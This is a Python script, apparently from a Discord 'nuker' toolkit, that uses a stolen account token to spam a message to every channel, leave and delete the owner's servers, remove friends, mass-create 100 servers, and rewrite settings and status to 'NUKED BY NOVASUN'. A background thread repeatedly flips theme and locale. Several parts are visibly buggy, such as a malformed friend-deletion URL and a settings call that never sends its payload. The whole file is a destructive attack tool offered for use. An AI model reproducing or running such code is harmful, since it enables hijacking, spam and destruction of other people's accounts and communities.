import os
import random
import requests
import threading
import time
from colorama import Fore
from itertools import cycle
from pystyle import Add, Center, Anime, Colors, Colorate, Write, System

from utilidades.config.comun1 import SlowPrint, getheaders, proxy
from NOVA import main

def NOVASUN_START(token, Server_Name, message_Content):
    if threading.active_count() <= 100:
        t = threading.Thread(target=CustomSeizure, args=(token, ))
        t.start()
    
    headers = {'Authorization':token}
    channelIds = requests.get('https://discord.com/api/v9/channels', headers=getheaders(token)).json()
    for channel in channelIds:
        try:
            requests.post(f'https://discord.com/api/v9/channels/'+channel['id']+'/messages', proxies = proxy(), headers = headers, data={'content':f'{message_Content}'})
            print(f"[RESPUESTA  ][{time.strftime('%H:%M:%S')}] ID: "+channel['id'])
        except Exception as e:
            print(f'Se ha encontrado el siguiente error: {e}')
    Write.Print(f'\n \nENVIADO A TODOS TUS AMIGOS\n', Colors.red_to_yellow, interval=0.009)
    guildsIds = requests.get('https://discord.com/api/v8/users/@me/guilds', headers=getheaders(token)).json()
    for guild in guildsIds:
        try:
            requests.delete(f'https://discord.com/api/v8/users/@me/guilds/'+guild['id'], proxies=proxy(), headers={'Authorization':token})
            print(f'[RESPUESTA  ][{time.strftime("%H:%M:%S")}] Se ha ido del servidor: '+guild['name']+Fore.RESET)
        except Exception as e:
            print(f'Se ha encontrado un error, se va a ignorar el error: {e}')
    for guild in guildsIds:
        try:
            requests.delete(f'https://discord.com/api/v8/guilds/'+guild['id'], proxies=proxy(), headers={'Authorization': token})
            print(f'[ {Fore.LIGHTMAGENTA_EX}${Fore.RESET} ] Borrado: '+guild['name'])
        except Exception as e:
            print(f'ERROR IGNORADO: {e}')
    Write.Print('\nAbandonado / Servidores Eliminados\n', Colors.red_to_yellow, interval=0.009)

    friendIds = requests.get('https://discord.com/api/v9/users/@me/relationships', proxies = proxy(), headers=getheaders(token))
    for friend in friendIds:
        try:
            requests.delete(f'https://discord.com/api/v9/users/@me/relationships'+friend['user']['username']+'#'+friend['user']['discriminator']+Fore.RESET)
            print(f'Amigo eliminado: ' +friend['user']['username']+"#"+friend['user']['discriminator'])
        except Exception as e:
            print(f'{Fore.LIGHTRED_EX}[ERROR  ][{time.strftime("%H:%M:%S")}] Ignorando el error {e}')
    Write.Print(f'[NUKER][{time.strftime("%H:%M:%S")}] Amigos eliminados', Colors.red_to_yellow, interval=0.009)

    for i in range(100):
        try:
            payload = {'name':{Server_Name}, 'region': 'europe', 'icon':None, 'channels':None}
            requests.post('https://discord.com/api/v7/guilds', proxies=proxy(), headers=getheaders(token), json=payload)
            print(f"[RESPUESTA  ][{time.strftime('%H:%M:%S')}] CREADOS  | {i}")
        except Exception as e:
            print(f'{Fore.LIGHTRED_EX}[ERROR  ]{Fore.RESET} SE ENCONTRÓ UN ERROR, IGNORANDO ERROR {e}')
    Write.Print(f'[RESPUESTA ][{time.strftime("H%:M%:S%")}] SERVIDORES CREADOS', Colors.red_to_yellow, interval=0.009)
    t.do_run = False
    requests.delete('https://discord.gg/v8/hypesquad/online', proxies=proxy(), headers=getheaders(token))
    setting = {
        'theme': 'light',
        'locale': '',
        'inline_embed_media': '',
        'inline_attachment_media': False,
        'gif_auto_play': False,
        'enable_tts_command': False,
        'render_embeds': False,
        'render_reactions': False,
        'animate_emoji': False,
        'convert_emoticons': False,
        'message_display_compact': False,
        'explicit_content_filter': '0',
        'custom_status': {'text': 'NUKED BY NOVASUN :3'},
        'status': 'dnd'
    }
    requests.patch('https://discord.com/api/v7/users/@me/settings', proxies=proxy(), headers=getheaders(token), json=setting)
    j = requests.get('https://discordapp.com/api/v9/users/@me', proxies=proxy(), headers=getheaders(token)).json()
    a = j['username'] + "#" + j['discriminator']
    Write.Print(f"[RESPUESTA    ][{time.strftime('%H:%M:%S')}] LA CUENTA FUE NUKEADA LLLLLLLLL")
    print(f"[INPUT   ][{time.strftime('%H:%M:%S')}] PRESIONA ENTER: ", end="")
    main()
def CustomSeizure(token):
    t = threading.currentThread()
    while getattr(t, "do_run", True):
        modes = cycle(['light', 'dark'])
        setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
        requests.patch('https://discord.com/api/v7/users/@me/settings', proxies=proxy(), headers=getheaders(token))